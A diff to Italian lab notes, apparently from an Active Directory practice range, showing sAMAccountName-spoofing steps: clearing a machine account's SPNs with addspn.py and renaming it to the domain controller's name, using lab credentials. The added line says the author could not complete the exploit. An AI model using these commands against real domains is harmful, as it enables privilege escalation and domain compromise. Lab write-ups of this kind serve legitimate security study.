@@ -119,7 +119,7 @@ Ora puliamo l'SPNs del nuovo computer
 python3 addspn.py --clear -t 'samaccountname$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'
 ```
 ![[Pasted image 20230825164134.png]]
-Rinominiamo il computer a DCl
+Rinominiamo il computer a DCl (Da qui in poi non sono riuscito a fare l'exploit)
 ```bash
 python3 renameMachine.py -current-name 'samaccountname$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/jon.snow:iknownothing
 ```
